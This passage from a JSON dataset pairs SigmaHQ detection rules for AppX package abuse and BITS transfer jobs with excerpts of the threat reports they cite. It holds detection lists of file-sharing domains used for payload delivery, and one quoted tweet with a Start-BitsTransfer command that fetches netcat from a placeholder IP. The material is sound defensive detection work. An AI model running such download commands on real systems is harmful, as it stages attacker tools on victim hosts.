            "C:\\PerfLogs\\",
            "C:/perflogs/",
            "\\Desktop\\",
            "/desktop/",
            "\\Downloads\\",
            "/Downloads/",
            "C:\\Windows\\Temp\\",
            "C:/Windows/Temp/",
            "\\AppdData\\Local\\Temp\\",
            "/AppdData/Local/Temp/"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_package_locations.yml"
  },
  "708": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Suspicious AppX Package Locations",
      "id": "5cdeaf3d-1489-477c-95ab-c318559fc051",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            "C:\\Users\\Public\\",
            "/users/public/",
            "C:\\PerfLogs\\",
            "C:/perflogs/",
            "\\Desktop\\",
            "/desktop/",
            "\\Downloads\\",
            "/Downloads/",
            "C:\\Windows\\Temp\\",
            "C:/Windows/Temp/",
            "\\AppdData\\Local\\Temp\\",
            "/AppdData/Local/Temp/"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_package_locations.yml"
  },
  "709": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps Use these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer. > **Note** > This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support. ## Get diagnostic information When an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs. To access the packaging and",
    "sigma_rule": {
      "title": "Suspicious AppX Package Locations",
      "id": "5cdeaf3d-1489-477c-95ab-c318559fc051",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            "C:\\Users\\Public\\",
            "/users/public/",
            "C:\\PerfLogs\\",
            "C:/perflogs/",
            "\\Desktop\\",
            "/desktop/",
            "\\Downloads\\",
            "/Downloads/",
            "C:\\Windows\\Temp\\",
            "C:/Windows/Temp/",
            "\\AppdData\\Local\\Temp\\",
            "/AppdData/Local/Temp/"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_package_locations.yml"
  },
  "710": {
    "url": "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
    "markdown": "# BazarLoader ‘call me back’ attack abuses Windows 10 Apps mechanism The unusual technique invokes the Windows App Installer to deliver malware **Posted on** November 11, 2021 ### Categories - SophosLabs Uncut - Threat Research - App Installer - BazarBackdoor - BazarLoader - Windows 10 Apps - Windows Store --- *Update (2021-01-15): Microsoft Security Response has issued CVE-2021-43890 in reference to the vulnerability in the App installer process described below. The bug was fixed in the January, 2022 Patch Tuesday release. We thank Microsoft for taking rapid action to address this vulnerability.* The emails that flooded into inboxes last week",
    "sigma_rule": {
      "title": "Suspicious AppX Package Locations",
      "id": "5cdeaf3d-1489-477c-95ab-c318559fc051",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in suspicious locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854,
          "Path|contains": [
            "C:\\Users\\Public\\",
            "/users/public/",
            "C:\\PerfLogs\\",
            "C:/perflogs/",
            "\\Desktop\\",
            "/desktop/",
            "\\Downloads\\",
            "/Downloads/",
            "C:\\Windows\\Temp\\",
            "C:/Windows/Temp/",
            "\\AppdData\\Local\\Temp\\",
            "/AppdData/Local/Temp/"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_susp_package_locations.yml"
  },
  "711": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Uncommon AppX Package Locations",
      "id": "c977cb50-3dff-4a9f-b873-9290f56132f1",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in uncommon locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-12-25",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854
        },
        "filter_main_generic": {
          "Path|contains": [
            "C:\\Program Files\\WindowsApps\\",
            "C:\\Program Files (x86)\\",
            "C:\\Windows\\SystemApps\\",
            "C:\\Windows\\PrintDialog\\",
            "C:\\Windows\\ImmersiveControlPanel\\",
            "x-windowsupdate://",
            "file:///C:/Program%20Files"
          ]
        },
        "filter_main_specific": {
          "Path|contains": [
            "https://statics.teams.cdn.live.net/",
            "https://statics.teams.cdn.office.net/",
            "microsoft.com",
            "https://installer.teams.static.microsoft/"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_uncommon_package_locations.yml"
  },
  "712": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Uncommon AppX Package Locations",
      "id": "c977cb50-3dff-4a9f-b873-9290f56132f1",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in uncommon locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-12-25",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854
        },
        "filter_main_generic": {
          "Path|contains": [
            "C:\\Program Files\\WindowsApps\\",
            "C:\\Program Files (x86)\\",
            "C:\\Windows\\SystemApps\\",
            "C:\\Windows\\PrintDialog\\",
            "C:\\Windows\\ImmersiveControlPanel\\",
            "x-windowsupdate://",
            "file:///C:/Program%20Files"
          ]
        },
        "filter_main_specific": {
          "Path|contains": [
            "https://statics.teams.cdn.live.net/",
            "https://statics.teams.cdn.office.net/",
            "microsoft.com",
            "https://installer.teams.static.microsoft/"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_uncommon_package_locations.yml"
  },
  "713": {
    "url": "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
    "markdown": "# Troubleshooting packaging, deployment, and query of Windows apps Use these suggestions to troubleshoot problems you experience when packaging, deploying, or querying a Windows app package (.msix/.appx) as a developer. > **Note** > This article is intended for developers. If you are not a developer and you are looking for help with a Windows app installation error, see Windows support. ## Get diagnostic information When an API fails, it returns an error code that describes the problem. If the error code doesn't provide enough information, you find more diagnostic information in the detailed event logs. To access the packaging and",
    "sigma_rule": {
      "title": "Uncommon AppX Package Locations",
      "id": "c977cb50-3dff-4a9f-b873-9290f56132f1",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in uncommon locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-12-25",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854
        },
        "filter_main_generic": {
          "Path|contains": [
            "C:\\Program Files\\WindowsApps\\",
            "C:\\Program Files (x86)\\",
            "C:\\Windows\\SystemApps\\",
            "C:\\Windows\\PrintDialog\\",
            "C:\\Windows\\ImmersiveControlPanel\\",
            "x-windowsupdate://",
            "file:///C:/Program%20Files"
          ]
        },
        "filter_main_specific": {
          "Path|contains": [
            "https://statics.teams.cdn.live.net/",
            "https://statics.teams.cdn.office.net/",
            "microsoft.com",
            "https://installer.teams.static.microsoft/"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_uncommon_package_locations.yml"
  },
  "714": {
    "url": "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/",
    "markdown": "# BazarLoader ‘call me back’ attack abuses Windows 10 Apps mechanism The unusual technique invokes the Windows App Installer to deliver malware **Posted on** November 11, 2021 ### Categories - SophosLabs Uncut - Threat Research - App Installer - BazarBackdoor - BazarLoader - Windows 10 Apps - Windows Store --- *Update (2021-01-15): Microsoft Security Response has issued CVE-2021-43890 in reference to the vulnerability in the App installer process described below. The bug was fixed in the January, 2022 Patch Tuesday release. We thank Microsoft for taking rapid action to address this vulnerability.* The emails that flooded into inboxes last week",
    "sigma_rule": {
      "title": "Uncommon AppX Package Locations",
      "id": "c977cb50-3dff-4a9f-b873-9290f56132f1",
      "status": "test",
      "description": "Detects an appx package added the pipeline of the \"to be processed\" packages which is located in uncommon locations",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
        "https://learn.microsoft.com/en-us/windows/win32/appxpkg/troubleshooting",
        "https://news.sophos.com/en-us/2021/11/11/bazarloader-call-me-back-attack-abuses-windows-10-apps-mechanism/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2024-12-25",
      "tags": [
        "attack.defense-evasion"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxdeployment-server"
      },
      "detection": {
        "selection": {
          "EventID": 854
        },
        "filter_main_generic": {
          "Path|contains": [
            "C:\\Program Files\\WindowsApps\\",
            "C:\\Program Files (x86)\\",
            "C:\\Windows\\SystemApps\\",
            "C:\\Windows\\PrintDialog\\",
            "C:\\Windows\\ImmersiveControlPanel\\",
            "x-windowsupdate://",
            "file:///C:/Program%20Files"
          ]
        },
        "filter_main_specific": {
          "Path|contains": [
            "https://statics.teams.cdn.live.net/",
            "https://statics.teams.cdn.office.net/",
            "microsoft.com",
            "https://installer.teams.static.microsoft/"
          ]
        },
        "condition": "selection and not 1 of filter_main_*"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxdeployment_server\\win_appxdeployment_server_uncommon_package_locations.yml"
  },
  "715": {
    "url": "Internal Research",
    "markdown": "",
    "sigma_rule": {
      "title": "Suspicious Digital Signature Of AppX Package",
      "id": "b5aa7d60-c17e-4538-97de-09029d6cd76b",
      "status": "test",
      "description": "Detects execution of AppX packages with known suspicious or malicious signature",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxpackaging-om"
      },
      "detection": {
        "selection": {
          "EventID": 157,
          "subjectName": "CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxpackaging_om\\win_appxpackaging_om_sups_appx_signature.yml"
  },
  "716": {
    "url": "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/",
    "markdown": "# Inside Malicious Windows Apps for Malware Deployment **Date:** July 14, 2022 This article discusses Windows Apps – Windows applications packaged into *APPX* or *MSIX* packages – as a medium to deploy malware. Though not as widely abused as other infection vectors, there have been a number of recent high profile attacks that use Windows Apps. - **November, 2021:** BazarBackdoor was distributed in the form of an *APPX* package. - **December, 2021:** Emotet malware was distributed by abusing a spoofing vulnerability in the Windows App Installer, software that installs Windows Apps. - **January, 2022:** Malicious Windows Apps in *APPX* format",
    "sigma_rule": {
      "title": "Suspicious Digital Signature Of AppX Package",
      "id": "b5aa7d60-c17e-4538-97de-09029d6cd76b",
      "status": "test",
      "description": "Detects execution of AppX packages with known suspicious or malicious signature",
      "references": [
        "Internal Research",
        "https://www.sentinelone.com/labs/inside-malicious-windows-apps-for-malware-deployment/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-16",
      "tags": [
        "attack.defense-evasion",
        "attack.execution"
      ],
      "logsource": {
        "product": "windows",
        "service": "appxpackaging-om"
      },
      "detection": {
        "selection": {
          "EventID": 157,
          "subjectName": "CN=Foresee Consulting Inc., O=Foresee Consulting Inc., L=North York, S=Ontario, C=CA, SERIALNUMBER=1004913-1, OID.1.3.6.1.4.1.311.60.2.1.3=CA, OID.2.5.4.15=Private Organization"
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "medium"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\appxpackaging_om\\win_appxpackaging_om_sups_appx_signature.yml"
  },
  "717": {
    "url": "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
    "markdown": "# T1197 - BITS Jobs ## Description from ATT&CK Adversaries may abuse BITS jobs to persistently execute or clean up after malicious payloads. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through Component Object Model (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations. The interface to create and manage BITS jobs is accessible through",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From File Sharing Domains",
      "id": "d635249d-86b5-4dad-a8c7-d7272b788586",
      "status": "experimental",
      "description": "Detects BITS transfer job downloading files from a file sharing domain.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
        "https://twitter.com/malmoeb/status/1535142803075960832",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2024-10-21",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_file_sharing_domains.yml"
  },
  "718": {
    "url": "https://twitter.com/malmoeb/status/1535142803075960832",
    "markdown": "# Post Jun 10, 2022 8/ 4. example: ``` Start-BitsTransfer -Source http://X.X.X.X/nc64.exe -Destination 'C:\\tmp\\nc.exe' ``` And we see a different user agent because we used BITS (the Background Intelligent Transfer Service). ```image Description: The image displays a technical output related to the Hypertext Transfer Protocol (HTTP) request for the file '/nc64.exe'. It shows the details of the GET request, which includes the request method, URI, version, connection type, accepted formats, and the user agent identified as 'Microsoft BITS/7.8'. The request is part of a context discussing the use of the Background Intelligent Transfer Service (BITS) to download files. Transcription: |",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From File Sharing Domains",
      "id": "d635249d-86b5-4dad-a8c7-d7272b788586",
      "status": "experimental",
      "description": "Detects BITS transfer job downloading files from a file sharing domain.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
        "https://twitter.com/malmoeb/status/1535142803075960832",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2024-10-21",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_file_sharing_domains.yml"
  },
  "719": {
    "url": "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
    "markdown": "# Ransomware: How Attackers are Breaching Corporate Networks ## Latest tools, tactics, and procedures being used by the Hive, Conti, and AvosLocker ransomware operations. Targeted ransomware attacks continue to be one of the most critical cyber risks facing organizations of all sizes. The tactics used by ransomware attackers are continually evolving, but by identifying the most frequently employed tools, tactics, and procedures (TTPs) organizations can gain a deeper understanding into how ransomware groups infiltrate networks and use this knowledge to identify and prioritize areas of weakness. Symantec, a division of Broadcom Software, tracks various ransomware threats; however, the following three",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From File Sharing Domains",
      "id": "d635249d-86b5-4dad-a8c7-d7272b788586",
      "status": "experimental",
      "description": "Detects BITS transfer job downloading files from a file sharing domain.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
        "https://twitter.com/malmoeb/status/1535142803075960832",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2024-10-21",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_file_sharing_domains.yml"
  },
  "720": {
    "url": "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/",
    "markdown": "# New TTPs observed in Mint Sandstorm campaign targeting high-profile individuals at universities and research orgs **Published on January 17, 2024** --- Since November 2023, Microsoft has observed a distinct subset of Mint Sandstorm (PHOSPHORUS) targeting high-profile individuals working on Middle Eastern affairs at universities and research organizations in Belgium, France, Gaza, Israel, the United Kingdom, and the United States. In this campaign, Mint Sandstorm used bespoke phishing lures in an attempt to socially engineer targets into downloading malicious files. In a handful of cases, Microsoft observed new post-intrusion tradecraft including the use of a new, custom backdoor called MediaPl.",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From File Sharing Domains",
      "id": "d635249d-86b5-4dad-a8c7-d7272b788586",
      "status": "experimental",
      "description": "Detects BITS transfer job downloading files from a file sharing domain.",
      "references": [
        "https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1197/T1197.md",
        "https://twitter.com/malmoeb/status/1535142803075960832",
        "https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/ransomware-hive-conti-avoslocker",
        "https://www.microsoft.com/en-us/security/blog/2024/01/17/new-ttps-observed-in-mint-sandstorm-campaign-targeting-high-profile-individuals-at-universities-and-research-orgs/"
      ],
      "author": "Florian Roth (Nextron Systems)",
      "date": "2022-06-28",
      "modified": "2024-10-21",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            ".githubusercontent.com",
            "anonfiles.com",
            "cdn.discordapp.com",
            "ddns.net",
            "dl.dropboxusercontent.com",
            "ghostbin.co",
            "glitch.me",
            "gofile.io",
            "hastebin.com",
            "mediafire.com",
            "mega.nz",
            "onrender.com",
            "pages.dev",
            "paste.ee",
            "pastebin.com",
            "pastebin.pl",
            "pastetext.net",
            "pixeldrain.com",
            "privatlab.com",
            "privatlab.net",
            "send.exploit.in",
            "sendspace.com",
            "storage.googleapis.com",
            "storjshare.io",
            "supabase.co",
            "temp.sh",
            "transfer.sh",
            "trycloudflare.com",
            "ufile.io",
            "w3spaces.com",
            "workers.dev"
          ]
        },
        "condition": "selection"
      },
      "falsepositives": [
        "Unknown"
      ],
      "level": "high"
    },
    "sigma_rule_category": "..\\data\\SigmaHQ\\rules\\windows\\builtin\\bits_client\\win_bits_client_new_transfer_via_file_sharing_domains.yml"
  },
  "721": {
    "url": "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
    "markdown": "# 15 Ways to Download a File **Network Pentesting | June 16, 2014** --- Pentesters often upload files to compromised boxes to help with privilege escalation, or to maintain a presence on the machine. This blog will cover 15 different ways to move files from your machine to a compromised system. It should be interesting for penetration testers who have a presence on a box and need post-exploitation options, and system admins that just want to move files. There are many other ways to move files onto machines during pentests, but this list includes some of my favorites. Below is",
    "sigma_rule": {
      "title": "BITS Transfer Job Download From Direct IP",
      "id": "90f138c1-f578-4ac3-8c49-eecfd847c8b7",
      "related": [
        {
          "id": "99c840f2-2012-46fd-9141-c761987550ef",
          "type": "similar"
        }
      ],
      "status": "test",
      "description": "Detects a BITS transfer job downloading file(s) from a direct IP address.",
      "references": [
        "https://blog.netspi.com/15-ways-to-download-a-file/#bitsadmin",
        "https://isc.sans.edu/diary/22264",
        "https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/",
        "https://blog.talosintelligence.com/breaking-the-silence-recent-truebot-activity/"
      ],
      "author": "Nasreddine Bencherchali (Nextron Systems)",
      "date": "2023-01-11",
      "modified": "2023-03-27",
      "tags": [
        "attack.defense-evasion",
        "attack.persistence",
        "attack.t1197"
      ],
      "logsource": {
        "product": "windows",
        "service": "bits-client"
      },
      "detection": {
        "selection": {
          "EventID": 16403,
          "RemoteName|contains": [
            "http://1",
            "http://2",
            "http://3",
            "http://4",
            "http://5",
            "http://6",
            "http://7",
            "http://8",
            "http://9",
            "https://1",
            "https://2",
            "https://3",
            "https://4",
            "https://5",
            "https://6",
            "https://7",
            "https://8",
            "https://9"
          ]
        },
        "filter_optional_local_networks": {
          "RemoteName|contains": [
            "://10.",
            "://192.168.",
            "://172.16.",
            "://172.17.",
            "://172.18.",
            "://172.19.",
            "://172.20.",
            "://172.21.",
            "://172.22.",
            "://172.23.",
            "://172.24.",
            "://172.25.",
            "://172.26.",
            "://172.27.",
            "://172.28.",
            "://172.29.",
            "://172.30.",
            "://172.31.",
            "://127.",
            "://169.254."
          ]
        },
        "filter_optional_seven_zip": {
          "RemoteName|contains": [
            "https://7-",
            "http://7-"
          ]
        },
